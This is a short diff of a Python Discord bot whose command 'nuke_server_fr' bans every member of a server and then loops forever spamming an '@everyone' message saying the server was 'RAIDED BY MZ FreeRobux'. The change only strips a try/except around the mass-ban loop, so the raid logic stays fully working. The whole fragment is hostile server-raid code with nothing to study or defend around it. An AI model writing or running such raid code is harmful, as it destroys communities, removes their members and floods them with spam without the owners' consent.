@@ -206,13 +206,8 @@ async def nuke_server_fr(ctx):
 
             await member.ban()  # Bans the member.
 
-        try:
-            for member in all_members_list:
-                await ban(member=member)
-        except:
-            None
-        finally:
-            None
+        for member in all_members_list:
+            await ban(member=member)
 
         while True:
             await newchannel.send('**<@everyone> (who is still here lol) RAIDED BY MZ FreeRobux '
